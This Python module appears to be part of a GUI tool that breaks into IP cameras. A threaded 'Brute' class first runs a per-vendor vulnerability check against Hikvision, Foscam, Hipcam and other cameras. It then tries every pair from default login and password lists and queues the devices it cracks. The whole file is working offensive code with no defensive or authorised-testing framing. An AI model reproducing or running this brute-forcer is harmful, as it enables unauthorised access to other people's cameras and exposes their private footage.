import threading
from PyQt5.QtCore import QThread

# from main import *
import config
from modules import progress, undefined
from modules.cameras import hipcam, hikvision, iCatch, foscam, goAhead, tenvis
from modules.paint import *
from threading import Thread


class Brute(QThread):

    devices = {
        'Hipcam': hipcam.HipCam,
        'Hikvision': hikvision.Hikvision,
        'iCatch': iCatch.ICatch,
        'Foscam': foscam.Foscam,
        'GoAhead': goAhead.GoAhead,
        'Tenvis': tenvis.Tenvis,
        'Undefined': undefined.Undefined
    }

    def __init__(self, brute_queue, sig, result_queue, parent=None, ):
        super(Brute, self).__init__(parent)
        self.sig = sig
        self.brute_queue = brute_queue
        self.result_queue = result_queue
        self.login_list = config.default_logins_list
        self.pass_list = config.default_passwords_list
        self.isRunning = True
        self.isDone = False
        self.maxThreads = 15
        self.threads = []
        self.data = {}


    def stop(self):
        self.isRunning = False
        [t.join(0.1) for t in self.threads]
        # self.brute_queue.task_done()

    def worker(self):
        logins = self.login_list
        passwords = self.pass_list
        vendor = self.data['vendor']
        device = self.devices[vendor](self)
        if device.try_for_vuln():
            return True
        for u, usr in enumerate(logins):
            for p, pwd in enumerate(passwords):
                try:
                    if self.isDone:
                        return
                    connect_worker = Thread(target=device.connect, args=(usr, pwd))
                    connect_worker.setDaemon(False)
                    connect_worker.start()
                    self.threads.append(connect_worker)
                    if (u + 1)*(p + 1) % self.maxThreads == 0 or (u + 1)*(p + 1) == len(logins)*len(passwords):
                        [t.join(5) for t in self.threads]
                        self.threads = []
                except ConnectionRefusedError:
                    return
        if not self.isDone:
            self.result_queue.put(self.data)
        # if self.isDone:
        #


    def run(self):
        # self.sig.stop_signal.connect(lambda: self.stop())
        while progress.isScan:
            try:
                self.isDone = False
                self.sig.change_brute_progress_str.emit(bold(
                    f'[{progress.get_brute_index()}/{progress.get_brute_total()}] Brute progress...'))
                with threading.Lock():
                    self.data = self.brute_queue.get()
                self.worker()
                progress.increment('brute_index')
            # self.sig.send_signal(build_terminal_line(self.data['ip'], self.data['vendor']))
                self.brute_queue.task_done()
            except Exception as e:
                print(e)
            finally:
                if progress.actual_action == 'bruteforcing':
                    total = progress.get_brute_total()
                    state = 0 if total == 0 else (progress.get_brute_index() * 100) / total
                    self.sig.send_change_progressBar(int(state))
                    if state == 100:
                        self.sig.change_actual_action.emit('Finish')
                        self.stop()
        return

